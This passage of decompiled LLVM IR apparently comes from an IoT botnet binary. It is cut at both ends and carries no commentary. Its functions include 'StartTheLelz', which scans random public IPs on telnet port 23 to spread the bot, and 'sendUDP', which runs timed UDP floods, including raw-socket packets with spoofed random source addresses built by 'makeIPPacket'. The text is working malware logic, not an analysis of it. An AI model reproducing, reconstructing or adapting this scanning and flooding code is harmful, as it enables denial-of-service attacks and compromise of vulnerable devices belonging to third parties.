  store i32 %v3_10003520, i32* %v3_10003530, align 4
  %v1_10003534 = load i32, i32* %r11.global-to-local, align 4
  %v2_10003534 = add i32 %v1_10003534, 12
  %v3_10003534 = inttoptr i32 %v2_10003534 to i32*
  store i32 %v3_10003524, i32* %v3_10003534, align 4
  %v1_10003538 = add i32 %tmp, 16
  %v2_10003538 = inttoptr i32 %v1_10003538 to i32*
  %v3_10003538 = load i32, i32* %v2_10003538, align 4
  %v1_1000353c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000353c = add i32 %v1_1000353c, 16
  %v3_1000353c = inttoptr i32 %v2_1000353c to i32*
  store i32 %v3_10003538, i32* %v3_1000353c, align 4
  %v5_10003548 = inttoptr i32 %v1_100034e0 to i16*
  %v6_10003548 = call i32 @csum(i16* %v5_10003548, i32 32, i32 %v3_10003524, i32 %v3_10003520, i32 %tmp)
  %sext = mul i32 %v6_10003548, 65536
  %v1_1000354c = sdiv i32 %sext, 65536
  store i32 268449116, i32* @lr, align 4
  %v1_10003558 = call i32 @free(i32 %v1_100034e0)
  %v1_10003560 = urem i32 %v1_1000354c, 65536
  %v2_10003568 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_10003568, i32* %r11.global-to-local, align 4
  ret i32 %v1_10003560

; uselistorder directives
  uselistorder i32 %v1_100034e0, { 3, 2, 1, 0, 4 }
  uselistorder i32 %tmp, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8 }
}

define i32 @makeIPPacket(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v1_100035b8 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_100035b8, i32* %arg1, align 4
  %v1_100035cc = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_100035cc, i32* %arg1, align 4
  %v3_100035dc = add i32 %tmp1, 1
  %v4_100035dc = inttoptr i32 %v3_100035dc to i8*
  store i8 0, i8* %v4_100035dc, align 1
  %fold = add i32 %arg5, 20
  %v1_100035f4 = trunc i32 %fold to i16
  %v3_100035f4 = add i32 %tmp1, 2
  %v4_100035f4 = inttoptr i32 %v3_100035f4 to i16*
  store i16 %v1_100035f4, i16* %v4_100035f4, align 2
  %v0_100035f8 = call i32 @rand_cmwc()
  %v1_10003608 = trunc i32 %v0_100035f8 to i16
  %v3_10003608 = add i32 %tmp1, 4
  %v4_10003608 = inttoptr i32 %v3_10003608 to i16*
  store i16 %v1_10003608, i16* %v4_10003608, align 2
  %v3_10003614 = add i32 %tmp1, 6
  %v4_10003614 = inttoptr i32 %v3_10003614 to i16*
  store i16 0, i16* %v4_10003614, align 2
  %v3_10003620 = add i32 %tmp1, 8
  %v4_10003620 = inttoptr i32 %v3_10003620 to i8*
  store i8 -1, i8* %v4_10003620, align 1
  %v3_1000362c = add i32 %tmp1, 9
  %v4_1000362c = inttoptr i32 %v3_1000362c to i8*
  store i8 %tmp, i8* %v4_1000362c, align 1
  %v3_10003638 = add i32 %tmp1, 10
  %v4_10003638 = inttoptr i32 %v3_10003638 to i16*
  store i16 0, i16* %v4_10003638, align 2
  %v2_10003644 = add i32 %tmp1, 12
  %v3_10003644 = inttoptr i32 %v2_10003644 to i32*
  store i32 %arg3, i32* %v3_10003644, align 4
  %v2_10003650 = add i32 %tmp1, 16
  %v3_10003650 = inttoptr i32 %v2_10003650 to i32*
  store i32 %arg2, i32* %v3_10003650, align 4
  ret i32 %v0_100035f8

; uselistorder directives
  uselistorder i8 -1, { 1, 2, 3, 4, 0 }
}

define i32 @sclose(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10003688 = icmp sgt i32 %arg1, 2
  br i1 %v2_10003688, label %dec_label_pc_1000369c, label %dec_label_pc_100036ac

dec_label_pc_1000369c:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_100036a4.49 to i32), i32* @lr, align 4
  %v1_100036a0 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_100036ac

dec_label_pc_100036ac:                            ; preds = %entry, %dec_label_pc_1000369c
  %storemerge = phi i32 [ 0, %dec_label_pc_1000369c ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_100036ac, { 1, 0 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100036cc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100036cc, i32* %stack_var_-240, align 4
  store i32 268449516, i32* @lr, align 4
  %v0_100036e8 = call i32 @getdtablesize()
  %v4_100036f0 = sdiv i32 %v0_100036e8, 4
  %v1_100036f8 = mul nsw i32 %v4_100036f0, 3
  store i32 %v1_100036f8, i32* %r9.global-to-local, align 4
  %tmp33 = icmp slt i32 %v1_100036f8, 513
  br i1 %tmp33, label %dec_label_pc_1000371c, label %dec_label_pc_10003714

dec_label_pc_10003714:                            ; preds = %entry
  br label %dec_label_pc_1000371c

dec_label_pc_1000371c:                            ; preds = %entry, %dec_label_pc_10003714
  %stack_var_-32.0 = phi i32 [ %v1_100036f8, %entry ], [ 512, %dec_label_pc_10003714 ]
  store i32 %stack_var_-32.0, i32* %r9.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i32 23, i32* @r3, align 4
  %v1_10003730 = call i32 @htons(i32 23)
  %v1_10003758 = mul i32 %stack_var_-32.0, 24
  %v1_10003760 = add i32 %v1_10003758, 30
  %v1_10003764 = and i32 %v1_10003760, -16
  %v2_1000376c = load i32, i32* %stack_var_-240, align 4
  %v1_10003774 = load i32, i32* @r1, align 4
  %v3_10003774 = sub i32 %v1_10003774, %v1_10003764
  %v4_10003774 = inttoptr i32 %v3_10003774 to i32*
  store i32 %v2_1000376c, i32* %v4_10003774, align 4
  %v1_10003784 = add i32 %v3_10003774, 23
  %v1_10003788 = and i32 %v1_10003784, -16
  store i32 %v1_10003788, i32* %r9.global-to-local, align 4
  %v1_100037a4 = mul i32 %stack_var_-32.0, 5
  store i32 ptrtoint (i32* @global_var_100037b8.50 to i32), i32* @lr, align 4
  %v3_100037b4 = call i32 @__GI_memset(i32 %v1_10003788, i32 0, i32 %v1_100037a4)
  store i32 %stack_var_-32.0, i32* %r9.global-to-local, align 4
  %v2_1000384410 = icmp sgt i32 %stack_var_-32.0, 0
  br i1 %v2_1000384410, label %dec_label_pc_100037c4.lr.ph, label %dec_label_pc_1000384c.preheader

dec_label_pc_100037c4.lr.ph:                      ; preds = %dec_label_pc_1000371c
  %v2_100037f8 = add i32 %v1_10003788, 20
  br label %dec_label_pc_100037c4

dec_label_pc_100037c4:                            ; preds = %dec_label_pc_100037c4.lr.ph, %dec_label_pc_100037c4
  %storemerge313 = phi i32 [ 0, %dec_label_pc_100037c4.lr.ph ], [ %v1_10003834, %dec_label_pc_100037c4 ]
  %v1_100037cc = mul i32 %storemerge313, 24
  %v2_100037d0 = add i32 %v1_100037cc, %v1_10003788
  store i32 %v2_100037d0, i32* %r9.global-to-local, align 4
  %v3_100037d8 = add i32 %v2_100037d0, 9
  %v4_100037d8 = inttoptr i32 %v3_100037d8 to i8*
  store i8 1, i8* %v4_100037d8, align 1
  store i32 %storemerge313, i32* @r29, align 4
  store i32 268449768, i32* @lr, align 4
  %v1_100037e4 = call i32 @malloc(i32 1024)
  %v0_100037f4 = load i32, i32* @r29, align 4
  %v1_100037f4 = mul i32 %v0_100037f4, 24
  %v1_100037fc = add i32 %v2_100037f8, %v1_100037f4
  %v2_10003800 = inttoptr i32 %v1_100037fc to i32*
  store i32 %v1_100037e4, i32* %v2_10003800, align 4
  %v1_10003814 = add i32 %v2_100037d0, 20
  store i32 %v1_10003814, i32* %r9.global-to-local, align 4
  %v1_10003818 = inttoptr i32 %v1_10003814 to i32*
  %v2_10003818 = load i32, i32* %v1_10003818, align 4
  store i32 1024, i32* %r9.global-to-local, align 4
  store i32 268449840, i32* @lr, align 4
  %v3_1000382c = call i32 @__GI_memset(i32 %v2_10003818, i32 0, i32 1024)
  %v1_10003834 = add nuw nsw i32 %storemerge313, 1
  store i32 %stack_var_-32.0, i32* %r9.global-to-local, align 4
  %v2_10003844 = icmp slt i32 %v1_10003834, %stack_var_-32.0
  br i1 %v2_10003844, label %dec_label_pc_100037c4, label %dec_label_pc_1000384c.preheader

dec_label_pc_1000384c.preheader:                  ; preds = %dec_label_pc_100037c4, %dec_label_pc_1000371c
  %v2_10003b68 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_1000384c

dec_label_pc_1000384c:                            ; preds = %dec_label_pc_1000384c, %dec_label_pc_10004e80, %dec_label_pc_1000384c.preheader
  store i32 %stack_var_-32.0, i32* %r9.global-to-local, align 4
  br i1 %v2_1000384410, label %dec_label_pc_10003858, label %dec_label_pc_1000384c

dec_label_pc_10003858:                            ; preds = %dec_label_pc_1000384c, %dec_label_pc_10004e80
  %storemerge48 = phi i32 [ %v1_10004e84, %dec_label_pc_10004e80 ], [ 0, %dec_label_pc_1000384c ]
  %v1_10003860 = mul i32 %storemerge48, 24
  %v2_10003864 = add i32 %v1_10003860, %v1_10003788
  store i32 %v2_10003864, i32* %r9.global-to-local, align 4
  %v1_10003868 = add i32 %v2_10003864, 8
  %v2_10003868 = inttoptr i32 %v1_10003868 to i8*
  %v3_10003868 = load i8, i8* %v2_10003868, align 8
  %v2_10003878 = icmp ugt i8 %v3_10003868, 8
  br i1 %v2_10003878, label %dec_label_pc_10004e80, label %dec_label_pc_10003880

dec_label_pc_10003880:                            ; preds = %dec_label_pc_10003858
  %v4_10003868 = zext i8 %v3_10003868 to i32
  %v1_10003884 = mul nuw nsw i32 %v4_10003868, 4
  %v2_10003890 = add i32 %v1_10003884, ptrtoint (i32* @global_var_1000e2bc.51 to i32)
  store i32 %v2_10003890, i32* %r9.global-to-local, align 4
  %v1_10003894 = inttoptr i32 %v2_10003890 to i32*
  %v2_10003894 = load i32, i32* %v1_10003894, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v2_100038a0 = add i32 %v2_10003894, ptrtoint (i32* @global_var_1000e2bc.51 to i32)
  call void @__pseudo_branch(i32 %v2_100038a0)
  %v1_100038bc = add i32 %v2_10003864, 20
  store i32 %v1_100038bc, i32* %r9.global-to-local, align 4
  %v1_100038c0 = inttoptr i32 %v1_100038bc to i32*
  %v2_100038c0 = load i32, i32* %v1_100038c0, align 4
  store i32 1024, i32* %r9.global-to-local, align 4
  store i32 268450008, i32* @lr, align 4
  %v3_100038d4 = call i32 @__GI_memset(i32 %v2_100038c0, i32 0, i32 1024)
  store i32 %v2_10003864, i32* %r9.global-to-local, align 4
  %v1_100038e8 = add i32 %v2_10003864, 9
  %v2_100038e8 = inttoptr i32 %v1_100038e8 to i8*
  %v3_100038e8 = load i8, i8* %v2_100038e8, align 1
  %v3_100038f0 = icmp eq i8 %v3_100038e8, 0
  br i1 %v3_100038f0, label %dec_label_pc_10003994, label %dec_label_pc_100038f8

dec_label_pc_100038f8:                            ; preds = %dec_label_pc_10003880
  store i32 %v1_100038bc, i32* %r9.global-to-local, align 4
  %v2_1000390c = load i32, i32* %v1_100038c0, align 4
  store i32 %v2_10003864, i32* %r9.global-to-local, align 4
  %v2_10003928 = inttoptr i32 %v2_10003864 to i32*
  store i32 0, i32* %v2_10003928, align 8
  %v1_10003930 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003930 = add i32 %v1_10003930, 4
  %v3_10003930 = inttoptr i32 %v2_10003930 to i32*
  store i32 0, i32* %v3_10003930, align 4
  %v1_10003938 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003938 = add i32 %v1_10003938, 8
  %v3_10003938 = inttoptr i32 %v2_10003938 to i32*
  store i32 0, i32* %v3_10003938, align 4
  %v1_10003940 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003940 = add i32 %v1_10003940, 12
  %v3_10003940 = inttoptr i32 %v2_10003940 to i32*
  store i32 0, i32* %v3_10003940, align 4
  %v1_10003948 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003948 = add i32 %v1_10003948, 16
  %v3_10003948 = inttoptr i32 %v2_10003948 to i32*
  store i32 0, i32* %v3_10003948, align 4
  %v1_10003950 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003950 = add i32 %v1_10003950, 20
  %v3_10003950 = inttoptr i32 %v2_10003950 to i32*
  store i32 0, i32* %v3_10003950, align 4
  store i32 %v1_100038bc, i32* %r9.global-to-local, align 4
  store i32 %v2_1000390c, i32* %v1_100038c0, align 4
  %v2_10003974 = call i32 @getRandomPublicIP(i32 %v3_100038d4, i32 %v1_100038bc)
  %v0_10003980 = load i32, i32* @r29, align 4
  %v1_10003980 = mul i32 %v0_10003980, 24
  %v2_10003984 = add i32 %v1_10003980, %v1_10003788
  %v1_10003988 = or i32 %v2_10003984, 4
  store i32 %v1_10003988, i32* %r9.global-to-local, align 4
  %v2_1000398c = inttoptr i32 %v1_10003988 to i32*
  store i32 %v2_10003974, i32* %v2_1000398c, align 4
  br label %dec_label_pc_10003a68

dec_label_pc_10003994:                            ; preds = %dec_label_pc_10003880
  store i32 %v2_10003864, i32* %r9.global-to-local, align 4
  %v1_100039a4 = add i32 %v2_10003864, 11
  %v2_100039a4 = inttoptr i32 %v1_100039a4 to i8*
  %v3_100039a4 = load i8, i8* %v2_100039a4, align 1
  %v1_100039ac = add i8 %v3_100039a4, 1
  store i8 %v1_100039ac, i8* %v2_100039a4, align 1
  store i32 %v2_10003864, i32* %r9.global-to-local, align 4
  %v3_100039d4 = load i8, i8* %v2_100039a4, align 1
  %v3_100039dc = icmp eq i8 %v3_100039d4, 10
  br i1 %v3_100039dc, label %dec_label_pc_100039e4, label %dec_label_pc_10003994.dec_label_pc_10003a2c_crit_edge

dec_label_pc_10003994.dec_label_pc_10003a2c_crit_edge: ; preds = %dec_label_pc_10003994
  %.pre = add i32 %v2_10003864, 10
  %.pre14 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_10003a2c

dec_label_pc_100039e4:                            ; preds = %dec_label_pc_10003994
  store i8 0, i8* %v2_100039a4, align 1
  store i32 %v2_10003864, i32* %r9.global-to-local, align 4
  %v1_10003a0c = add i32 %v2_10003864, 10
  %v2_10003a0c = inttoptr i32 %v1_10003a0c to i8*
  %v3_10003a0c = load i8, i8* %v2_10003a0c, align 2
  %v1_10003a14 = add i8 %v3_10003a0c, 1
  store i32 %v2_10003864, i32* %r9.global-to-local, align 4
  store i8 %v1_10003a14, i8* %v2_10003a0c, align 2
  br label %dec_label_pc_10003a2c

dec_label_pc_10003a2c:                            ; preds = %dec_label_pc_10003994.dec_label_pc_10003a2c_crit_edge, %dec_label_pc_100039e4
  %v2_10003a3c.pre-phi = phi i8* [ %.pre14, %dec_label_pc_10003994.dec_label_pc_10003a2c_crit_edge ], [ %v2_10003a0c, %dec_label_pc_100039e4 ]
  store i32 %v2_10003864, i32* %r9.global-to-local, align 4
  %v3_10003a3c = load i8, i8* %v2_10003a3c.pre-phi, align 2
  %v3_10003a44 = icmp eq i8 %v3_10003a3c, 3
  br i1 %v3_10003a44, label %dec_label_pc_10003a4c, label %dec_label_pc_10003a2c.dec_label_pc_10003a68_crit_edge

dec_label_pc_10003a2c.dec_label_pc_10003a68_crit_edge: ; preds = %dec_label_pc_10003a2c
  %.pre15 = inttoptr i32 %v2_10003864 to i32*
  br label %dec_label_pc_10003a68

dec_label_pc_10003a4c:                            ; preds = %dec_label_pc_10003a2c
  store i32 %v2_10003864, i32* %r9.global-to-local, align 4
  store i8 1, i8* %v2_100038e8, align 1
  br label %dec_label_pc_10004e80

dec_label_pc_10003a68:                            ; preds = %dec_label_pc_10003a2c.dec_label_pc_10003a68_crit_edge, %dec_label_pc_100038f8
  %v1_10003aec.pre-phi = phi i32* [ %.pre15, %dec_label_pc_10003a2c.dec_label_pc_10003a68_crit_edge ], [ %v2_10003928, %dec_label_pc_100038f8 ]
  store i32 2, i32* %stack_var_-60, align 4
  store i32 23, i32* @r3, align 4
  %v1_10003a74 = call i32 @htons(i32 23)
  %v1_10003aa8 = or i32 %v2_10003864, 4
  store i32 %v1_10003aa8, i32* %r9.global-to-local, align 4
  store i32 268450504, i32* @lr, align 4
  %v3_10003ac4 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_10003ad0 = mul i32 %storemerge48, 24
  %v2_10003ad4 = add i32 %v1_10003ad0, %v1_10003788
  %v2_10003ad8 = inttoptr i32 %v2_10003ad4 to i32*
  store i32 %v3_10003ac4, i32* %v2_10003ad8, align 8
  store i32 %v2_10003864, i32* %r9.global-to-local, align 4
  %v2_10003aec = load i32, i32* %v1_10003aec.pre-phi, align 8
  store i32 %v2_10003aec, i32* %r9.global-to-local, align 4
  %v4_10003af4 = icmp eq i32 %v2_10003aec, -1
  br i1 %v4_10003af4, label %dec_label_pc_10004e80, label %dec_label_pc_10003afc

dec_label_pc_10003afc:                            ; preds = %dec_label_pc_10003a68
  store i32 %v2_10003864, i32* %r9.global-to-local, align 4
  %v2_10003b0c = load i32, i32* %v1_10003aec.pre-phi, align 8
  store i32 %v2_10003864, i32* %r9.global-to-local, align 4
  %v2_10003b20 = load i32, i32* %v1_10003aec.pre-phi, align 8
  store i32 268450616, i32* @lr, align 4
  %v2_10003b34 = call i32 @__libc_fcntl(i32 %v2_10003b20, i32 3)
  store i32 268450644, i32* @lr, align 4
  %v2_10003b50 = call i32 @__libc_fcntl(i32 %v2_10003b0c, i32 4)
  store i32 %v2_10003864, i32* %r9.global-to-local, align 4
  %v2_10003b64 = load i32, i32* %v1_10003aec.pre-phi, align 8
  store i32 %v2_10003b68, i32* %r9.global-to-local, align 4
  store i32 268450684, i32* @lr, align 4
  %v3_10003b78 = call i32 @__libc_connect(i32 %v2_10003b64, i32 %v2_10003b68, i32 16)
  store i32 %v3_10003b78, i32* %r9.global-to-local, align 4
  %v4_10003b84 = icmp eq i32 %v3_10003b78, -1
  br i1 %v4_10003b84, label %dec_label_pc_10003b8c, label %dec_label_pc_10003bd8

dec_label_pc_10003b8c:                            ; preds = %dec_label_pc_10003afc
  %v0_10003b8c = call i32 @__errno_location()
  store i32 %v0_10003b8c, i32* %r9.global-to-local, align 4
  %v1_10003b94 = inttoptr i32 %v0_10003b8c to i32*
  %v2_10003b94 = load i32, i32* %v1_10003b94, align 4
  %v3_10003b98 = icmp eq i32 %v2_10003b94, 115
  br i1 %v3_10003b98, label %dec_label_pc_10003bd8, label %dec_label_pc_10003ba0

dec_label_pc_10003ba0:                            ; preds = %dec_label_pc_10003b8c
  store i32 %v2_10003864, i32* %r9.global-to-local, align 4
  %v2_10003bb0 = load i32, i32* %v1_10003aec.pre-phi, align 8
  %v2_10003bb8 = call i32 @sclose(i32 %v2_10003bb0, i32 %v2_10003864)
  store i32 %v2_10003864, i32* %r9.global-to-local, align 4
  store i8 1, i8* %v2_100038e8, align 1
  br label %dec_label_pc_10004e80

dec_label_pc_10003bd8:                            ; preds = %dec_label_pc_10003afc, %dec_label_pc_10003b8c
  store i8 1, i8* %v2_10003868, align 8
  %v1_10003c00 = add i32 %v2_10003864, 12
  store i32 %v1_10003c00, i32* %r9.global-to-local, align 4
  %v2_10003c08 = inttoptr i32 %v1_10003c00 to i32*
  store i32 0, i32* %v2_10003c08, align 4
  br label %dec_label_pc_10004e80

dec_label_pc_10004e80:                            ; preds = %dec_label_pc_10003a68, %dec_label_pc_10003858, %dec_label_pc_10003bd8, %dec_label_pc_10003ba0, %dec_label_pc_10003a4c
  %v1_10004e84 = add nuw nsw i32 %storemerge48, 1
  store i32 %stack_var_-32.0, i32* %r9.global-to-local, align 4
  %v2_10004e94 = icmp slt i32 %v1_10004e84, %stack_var_-32.0
  br i1 %v2_10004e94, label %dec_label_pc_10003858, label %dec_label_pc_1000384c

; uselistorder directives
  uselistorder i32 %v1_10004e84, { 1, 0 }
  uselistorder i32* %v1_10003aec.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_100039a4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10003988, { 1, 0 }
  uselistorder i32 %v1_100038bc, { 1, 0, 2, 3, 4 }
  uselistorder i8 %v3_10003868, { 1, 0 }
  uselistorder i32 %v2_10003864, { 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 0, 15, 2, 17, 16, 1, 18, 20, 19, 4, 3, 22, 21, 23, 24, 25 }
  uselistorder i32 %storemerge48, { 2, 0, 1 }
  uselistorder i32 %storemerge313, { 2, 1, 0 }
  uselistorder i32 %stack_var_-32.0, { 4, 3, 2, 6, 5, 0, 1, 7, 8, 9 }
  uselistorder i32* %stack_var_-60, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 31, 0, 1, 2, 3, 6, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 21, 22, 24, 25, 26, 27, 42, 41, 28, 29, 30, 39, 35, 32, 33, 34, 40, 36, 37, 38 }
  uselistorder label %dec_label_pc_10004e80, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_10003bd8, { 1, 0 }
  uselistorder label %dec_label_pc_10003a2c, { 1, 0 }
  uselistorder label %dec_label_pc_10003858, { 1, 0 }
  uselistorder label %dec_label_pc_1000384c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100037c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000371c, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10004ea0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10004ea0, i32* %stack_var_-144, align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_10004edc = icmp eq i32 %arg2, 0
  br i1 %v3_10004edc, label %dec_label_pc_10004ee4, label %dec_label_pc_10004ef8

dec_label_pc_10004ee4:                            ; preds = %entry
  %v0_10004ee4 = call i32 @rand_cmwc()
  br label %dec_label_pc_10004f10

dec_label_pc_10004ef8:                            ; preds = %entry
  %v1_10004efc = urem i32 %arg2, 65536
  store i32 %v1_10004efc, i32* @r3, align 4
  %v1_10004f04 = call i32 @htons(i32 %v1_10004efc)
  br label %dec_label_pc_10004f10

dec_label_pc_10004f10:                            ; preds = %dec_label_pc_10004ee4, %dec_label_pc_10004ef8
  %v2_10004f10 = ptrtoint i32* %stack_var_-96 to i32
  %v4_10004f20 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-92, i32 %v2_10004f10)
  %v3_10004f28 = icmp eq i32 %v4_10004f20, 0
  br i1 %v3_10004f28, label %dec_label_pc_10004f30, label %dec_label_pc_10005424

dec_label_pc_10004f30:                            ; preds = %dec_label_pc_10004f10
  %v3_10004f54 = icmp eq i32 %arg4, 32
  br i1 %v3_10004f54, label %dec_label_pc_10004f5c, label %dec_label_pc_10005078

dec_label_pc_10004f5c:                            ; preds = %dec_label_pc_10004f30
  store i32 268455788, i32* @lr, align 4
  %v3_10004f68 = call i32 @socket(i32 2, i32 2, i32 17)
  %v3_10004f78 = icmp eq i32 %v3_10004f68, 0
  br i1 %v3_10004f78, label %dec_label_pc_10005424, label %dec_label_pc_10004f80

dec_label_pc_10004f80:                            ; preds = %dec_label_pc_10004f5c
  %v1_10004f84 = add i32 %arg5, 1
  store i32 268455824, i32* @lr, align 4
  %v1_10004f8c = call i32 @malloc(i32 %v1_10004f84)
  %v3_10004f9c = icmp eq i32 %v1_10004f8c, 0
  br i1 %v3_10004f9c, label %dec_label_pc_10005424, label %dec_label_pc_10004fa4

dec_label_pc_10004fa4:                            ; preds = %dec_label_pc_10004f80
  store i32 268455876, i32* @lr, align 4
  %v3_10004fc0 = call i32 @__GI_memset(i32 %v1_10004f8c, i32 0, i32 %v1_10004f84)
  %v2_10004fcc = call i32 @makeRandomStr(i32 %v1_10004f8c, i32 %arg5)
  store i32 268455896, i32* @lr, align 4
  %v1_10004fd4 = call i32 @__GI_time(i32 0)
  %v2_10004fe0 = add i32 %v1_10004fd4, %arg3
  br label %dec_label_pc_10004ff4

dec_label_pc_10004ff4:                            ; preds = %dec_label_pc_10005068, %dec_label_pc_10005044, %dec_label_pc_10004fa4
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_10004fa4 ], [ %v1_1000506c, %dec_label_pc_10005068 ], [ 0, %dec_label_pc_10005044 ]
  store i32 268455960, i32* @lr, align 4
  %v7_10005014 = call i32 @__libc_sendto(i32 %v3_10004f68, i32 %v1_10004f8c, i32 %arg5, i32 0, i32 %v2_10004f10, i32 16, i32 %v2_10004f10)
  %v4_10005020 = icmp eq i32 %stack_var_-44.0, %arg6
  br i1 %v4_10005020, label %dec_label_pc_10005028, label %dec_label_pc_10005068

dec_label_pc_10005028:                            ; preds = %dec_label_pc_10004ff4
  br i1 %v3_10004edc, label %dec_label_pc_10005034, label %dec_label_pc_10005044

dec_label_pc_10005034:                            ; preds = %dec_label_pc_10005028
  %v0_10005034 = call i32 @rand_cmwc()
  br label %dec_label_pc_10005044

dec_label_pc_10005044:                            ; preds = %dec_label_pc_10005028, %dec_label_pc_10005034
  store i32 268456012, i32* @lr, align 4
  %v1_10005048 = call i32 @__GI_time(i32 0)
  %v3_10005054 = icmp sgt i32 %v1_10005048, %v2_10004fe0
  br i1 %v3_10005054, label %dec_label_pc_10005424, label %dec_label_pc_10004ff4

dec_label_pc_10005068:                            ; preds = %dec_label_pc_10004ff4
  %v1_1000506c = add i32 %stack_var_-44.0, 1
  br label %dec_label_pc_10004ff4

dec_label_pc_10005078:                            ; preds = %dec_label_pc_10004f30
  store i32 268456080, i32* @lr, align 4
  %v3_1000508c = call i32 @socket(i32 2, i32 3, i32 17)
  %v3_1000509c = icmp eq i32 %v3_1000508c, 0
  br i1 %v3_1000509c, label %dec_label_pc_10005414, label %dec_label_pc_100050a8

dec_label_pc_100050a8:                            ; preds = %dec_label_pc_10005078
  store i32 1, i32* %stack_var_-80, align 4
  %v2_100050b0 = ptrtoint i32* %stack_var_-80 to i32
  store i32 268456140, i32* @lr, align 4
  %v5_100050c8 = call i32 @__GI_setsockopt(i32 %v3_1000508c, i32 0, i32 3, i32 %v2_100050b0, i32 4)
  %tmp70 = icmp sgt i32 %v5_100050c8, -1
  br i1 %tmp70, label %dec_label_pc_100050dc, label %dec_label_pc_10005414

dec_label_pc_100050dc:                            ; preds = %dec_label_pc_100050a8
  br label %dec_label_pc_100050e8

dec_label_pc_100050e8:                            ; preds = %dec_label_pc_100050dc, %dec_label_pc_100050e8
  %v1_1000512020 = phi i32 [ 49, %dec_label_pc_100050dc ], [ %v1_10005120, %dec_label_pc_100050e8 ]
  store i32 268456176, i32* @lr, align 4
  %v1_100050ec = call i32 @__GI_time(i32 0)
  %v0_100050f8 = call i32 @rand_cmwc()
  %v2_10005100 = xor i32 %v1_100050ec, %v0_100050f8
  store i32 ptrtoint (i32* @global_var_1000510c.85 to i32), i32* @lr, align 4
  %v1_10005108 = call i32 @srand(i32 %v2_10005100)
  store i32 268456208, i32* @lr, align 4
  %v0_1000510c = call i32 @random()
  %v1_10005118 = call i32 @init_rand(i32 %v0_1000510c)
  %v1_10005120 = add nsw i32 %v1_1000512020, -1
  %v4_10005130 = icmp eq i32 %v1_1000512020, 0
  br i1 %v4_10005130, label %dec_label_pc_10005138, label %dec_label_pc_100050e8

dec_label_pc_10005138:                            ; preds = %dec_label_pc_100050e8
  %v3_1000513c = icmp eq i32 %arg4, 0
  br i1 %v3_1000513c, label %dec_label_pc_10005168, label %dec_label_pc_10005150

dec_label_pc_10005150:                            ; preds = %dec_label_pc_10005138
  %v1_10005154 = sub i32 32, %arg4
  %v2_1000515c = urem i32 %v1_10005154, 64
  %v1_10005160 = shl i32 -1, %v2_1000515c
  br label %dec_label_pc_10005168

dec_label_pc_10005168:                            ; preds = %dec_label_pc_10005138, %dec_label_pc_10005150
  %storemerge10 = phi i32 [ %v1_10005160, %dec_label_pc_10005150 ], [ 0, %dec_label_pc_10005138 ]
  %v1_1000516c = add i32 %arg5, 28
  %v1_1000517c = add i32 %arg5, 58
  %v1_10005180 = and i32 %v1_1000517c, -16
  %v2_10005188 = load i32, i32* %stack_var_-144, align 4
  %v1_10005190 = load i32, i32* @r1, align 4
  %v3_10005190 = sub i32 %v1_10005190, %v1_10005180
  %v4_10005190 = inttoptr i32 %v3_10005190 to i32*
  store i32 %v2_10005188, i32* %v4_10005190, align 4
  %v1_100051a0 = add i32 %v3_10005190, 23
  %v1_100051a4 = and i32 %v1_100051a0, -16
  %v1_100051c4 = add i32 %v1_100051a4, 20
  %v5_100051c8 = inttoptr i32 %v1_100051c4 to i16*
  %v3_100051cc = load i32, i32* %stack_var_-92, align 4
  %v1_100051d4 = call i32 @getRandomIP(i32 %storemerge10)
  store i32 %v1_100051d4, i32* @r3, align 4
  %v1_100051e0 = call i32 @htonl(i32 %v1_100051d4)
  %v1_100051ec = add i32 %arg5, 8
  %v6_10005204 = inttoptr i32 %v1_100051a4 to i32*
  %v7_10005204 = call i32 @makeIPPacket(i32* %v6_10005204, i32 %v3_100051cc, i32 %v1_100051e0, i32 17, i32 %v1_100051ec, i32 %arg5)
